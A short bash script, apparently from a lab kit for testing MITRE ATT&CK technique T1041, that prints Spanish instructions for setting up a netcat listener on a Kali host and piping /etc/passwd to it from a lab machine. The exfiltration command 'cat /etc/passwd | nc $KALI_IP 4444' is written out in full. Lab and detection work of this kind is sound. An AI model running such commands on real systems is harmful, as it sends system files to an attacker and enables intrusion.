#!/usr/bin/env bash
source "$(dirname "$0")/../config.sh"
echo "[T1041] Exfiltración por netcat hacia $KALI_IP:4444"
echo "En Kali, antes de correr esto: nc -lvnp 4444 > ../evidencia/exfil_recibido.txt"
echo "Luego, DENTRO de agent-linux: cat /etc/passwd | nc $KALI_IP 4444"
